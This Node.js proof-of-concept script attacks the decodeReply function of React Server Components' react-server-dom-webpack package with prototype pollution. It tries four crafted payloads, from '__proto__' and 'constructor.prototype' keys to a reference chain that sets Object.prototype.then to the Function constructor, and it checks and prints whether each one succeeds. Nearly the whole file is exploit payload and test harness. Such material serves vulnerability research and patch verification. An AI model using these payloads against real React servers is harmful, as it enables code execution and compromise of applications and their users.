/**
 * Test: Prototype Pollution via __proto__
 *
 * The patch added:
 *   void 0 !== parentObj || "__proto__" === i
 *
 * This suggests the vulnerable version could pollute Object.prototype!
 *
 * If we can pollute Object.prototype.then = Function
 * Then when ANY object is awaited, it becomes a thenable!
 */

'use strict';

const webpackServerMap = {};

global.__webpack_chunk_load__ = id => Promise.resolve();
global.__webpack_require__ = id => ({});

process.env.NODE_ENV = 'production';
require.cache[require.resolve('react')] = {
  id: require.resolve('react'),
  filename: require.resolve('react'),
  loaded: true,
  exports: {
    __SERVER_INTERNALS_DO_NOT_USE_OR_WARN_USERS_THEY_CANNOT_UPGRADE: { H: null, A: null },
    version: '19.0.0',
  }
};

const { decodeReply } = require('react-server-dom-webpack/server.node');

console.log('='.repeat(60));
console.log('Test: Prototype Pollution via decodeReply');
console.log('='.repeat(60));
console.log('');

async function test() {
  console.log('[BEFORE] Object.prototype.polluted:', Object.prototype.polluted);
  console.log('[BEFORE] ({}).polluted:', ({}).polluted);
  console.log('');

  // Try to pollute Object.prototype
  // The key insight: {"__proto__": {"polluted": "YES"}}
  // If reviveModel sets value["__proto__"] = revived object
  // And revived object has {"polluted": "YES"}
  // This MIGHT pollute Object.prototype!

  const formData = new Map();

  // Attempt 1: Direct __proto__ pollution
  console.log('[TEST 1] Attempting {"__proto__": {"polluted": "YES"}}');
  formData.clear();
  formData.set('0', '{"__proto__": {"polluted": "YES"}}');
  formData.forEach = function(cb) { for (const [k, v] of this.entries()) cb(v, k); };

  try {
    const result = await decodeReply(formData, webpackServerMap);
    console.log('  Result:', JSON.stringify(result));
    console.log('  [AFTER] Object.prototype.polluted:', Object.prototype.polluted);
    console.log('  [AFTER] ({}).polluted:', ({}).polluted);
  } catch (e) {
    console.log('  Error:', e.message);
  }
  console.log('');

  // Attempt 2: Nested object with __proto__
  console.log('[TEST 2] Attempting nested: {"a": {"__proto__": {"polluted2": "YES2"}}}');
  formData.clear();
  formData.set('0', '{"a": {"__proto__": {"polluted2": "YES2"}}}');
  formData.forEach = function(cb) { for (const [k, v] of this.entries()) cb(v, k); };

  try {
    const result = await decodeReply(formData, webpackServerMap);
    console.log('  Result:', JSON.stringify(result));
    console.log('  [AFTER] Object.prototype.polluted2:', Object.prototype.polluted2);
  } catch (e) {
    console.log('  Error:', e.message);
  }
  console.log('');

  // Attempt 3: constructor.prototype pollution
  console.log('[TEST 3] Attempting constructor.prototype pollution');
  formData.clear();
  formData.set('0', '{"constructor": {"prototype": {"polluted3": "YES3"}}}');
  formData.forEach = function(cb) { for (const [k, v] of this.entries()) cb(v, k); };

  try {
    const result = await decodeReply(formData, webpackServerMap);
    console.log('  Result:', JSON.stringify(result));
    console.log('  [AFTER] Object.prototype.polluted3:', Object.prototype.polluted3);
  } catch (e) {
    console.log('  Error:', e.message);
  }
  console.log('');

  // Attempt 4: Using reference to get Function and pollute prototype.then
  console.log('[TEST 4] Trying to pollute with Function via reference');
  formData.clear();
  formData.set('0', '{"__proto__": {"then": "$1:__proto__:constructor:constructor"}}');
  formData.set('1', '{"x":1}');
  formData.forEach = function(cb) { for (const [k, v] of this.entries()) cb(v, k); };

  try {
    const result = await decodeReply(formData, webpackServerMap);
    console.log('  Result:', result);
    console.log('  [AFTER] Object.prototype.then:', Object.prototype.then);
    console.log('  [AFTER] ({}).then:', ({}).then);

    if (({}).then === Function) {
      console.log('');
      console.log('  *** PROTOTYPE POLLUTION SUCCESSFUL! ***');
      console.log('  Object.prototype.then = Function');
      console.log('');
      console.log('  Now any await on plain object calls Function!');
    }
  } catch (e) {
    console.log('  Error:', e.message);
  }
  console.log('');
}

test().catch(console.error);
